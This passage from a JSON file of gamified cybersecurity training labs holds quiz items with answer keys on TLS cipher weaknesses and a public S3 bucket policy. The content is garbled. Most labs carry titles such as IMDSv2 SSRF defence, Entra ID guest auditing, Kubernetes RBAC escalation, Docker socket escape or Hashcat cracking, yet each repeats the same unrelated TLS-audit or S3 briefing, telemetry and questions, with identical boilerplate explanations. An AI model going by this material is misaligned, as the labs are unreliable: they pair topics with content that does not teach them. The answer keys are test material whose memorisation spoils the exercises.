          "GetObject"
        ],
        "hint": "Action field in statement.",
        "explanation": "Expected: s3:GetObject. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What AWS S3 feature should be enabled at the account level to override and prevent public policies?",
        "expected": "S3 Block Public Access",
        "acceptedKeywords": [
          "S3 Block Public Access",
          "Block Public Access"
        ],
        "hint": "Core S3 security control.",
        "explanation": "Expected: S3 Block Public Access. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What security logging service recorded this administrative PutBucketPolicy event?",
        "expected": "AWS CloudTrail",
        "acceptedKeywords": [
          "AWS CloudTrail",
          "CloudTrail"
        ],
        "hint": "AWS API audit logging service.",
        "explanation": "Expected: AWS CloudTrail. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What foundational cybersecurity principle restricts user capabilities to only what is required for their job?",
        "expected": "Least Privilege",
        "acceptedKeywords": [
          "Least Privilege",
          "Principle of Least Privilege",
          "PoLP"
        ],
        "hint": "Core access control doctrine.",
        "explanation": "Expected: Least Privilege. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enable S3 Block Public Access immediately on tactical-telemetry-archive, remove wildcard policy, and restrict dev-cadet permissions using Service Control Policies (SCPs)."
  },
  {
    "id": "lab-cld-004",
    "category": "Cloud Security & IAM Defense",
    "title": "AWS EC2 Instance Metadata Service (IMDSv2) SSRF Defense Migration",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-005",
    "category": "Cloud Security & IAM Defense",
    "title": "Microsoft Entra ID (Azure AD) Excessive Guest Permission Auditing",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-006",
    "category": "Cloud Security & IAM Defense",
    "title": "Azure Key Vault Secret Exfiltration Audit & Access Policy Hardening",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-007",
    "category": "Cloud Security & IAM Defense",
    "title": "Google Cloud Platform (GCP) Service Account Key Leak Remediation",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-008",
    "category": "Cloud Security & IAM Defense",
    "title": "Kubernetes RBAC Privilege Escalation to cluster-admin Role",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 210,
    "briefing": "Cloud security posture management detected a misconfigured resource in the tactical cloud tenancy. Audit IAM permissions, identify exposure vectors, and enforce cloud least-privilege standards.",
    "telemetry": "AWS CloudTrail Event:\neventName: PutBucketPolicy\nuserIdentity: { type: \"IAMUser\", userName: \"dev-cadet\", arn: \"arn:aws:iam::123456789012:user/dev-cadet\" }\nrequestParameters: {\n  bucketName: \"tactical-telemetry-archive\",\n  BucketPolicy: {\n    \"Statement\": [{\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::tactical-telemetry-archive/*\"\n    }]\n  }\n}",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What IAM user applied the insecure bucket policy?",
        "expected": "dev-cadet",
        "acceptedKeywords": [
          "dev-cadet"
        ],
        "hint": "userName in userIdentity block.",
        "explanation": "Expected: dev-cadet. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What wildcard character in \"Principal\": \"*\" opens the bucket to everyone on the public internet?",
        "expected": "*",
        "acceptedKeywords": [
          "*",
          "asterisk",
          "wildcard"
        ],
        "hint": "Wildcard symbol.",
        "explanation": "Expected: *. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What S3 action permission was granted to anonymous public users?",
        "expected": "s3:GetObject",
        "acceptedKeywords": [
          "s3:GetObject",
          "GetObject"
        ],
        "hint": "Action field in statement.",
        "explanation": "Expected: s3:GetObject. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What AWS S3 feature should be enabled at the account level to override and prevent public policies?",
        "expected": "S3 Block Public Access",
        "acceptedKeywords": [
          "S3 Block Public Access",
          "Block Public Access"
        ],
        "hint": "Core S3 security control.",
        "explanation": "Expected: S3 Block Public Access. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. What security logging service recorded this administrative PutBucketPolicy event?",
        "expected": "AWS CloudTrail",
        "acceptedKeywords": [
          "AWS CloudTrail",
          "CloudTrail"
        ],
        "hint": "AWS API audit logging service.",
        "explanation": "Expected: AWS CloudTrail. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What foundational cybersecurity principle restricts user capabilities to only what is required for their job?",
        "expected": "Least Privilege",
        "acceptedKeywords": [
          "Least Privilege",
          "Principle of Least Privilege",
          "PoLP"
        ],
        "hint": "Core access control doctrine.",
        "explanation": "Expected: Least Privilege. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Enable S3 Block Public Access immediately on tactical-telemetry-archive, remove wildcard policy, and restrict dev-cadet permissions using Service Control Policies (SCPs)."
  },
  {
    "id": "lab-cld-009",
    "category": "Cloud Security & IAM Defense",
    "title": "Container Escape via Host Docker Socket Mounting (/var/run/docker.sock)",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-010",
    "category": "Cloud Security & IAM Defense",
    "title": "Infrastructure as Code (Terraform) Security Scan via tfsec / Checkov",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cld-011",
    "category": "Cloud Security & IAM Defense",
    "title": "Cloud Security Posture Management (CSPM) Critical Alert Remediation",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-cry-001",
    "category": "Cryptography & Protocol Hardening",
    "title": "Cracking NTLM & Shadow Hashes using Hashcat Mask Attacks",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
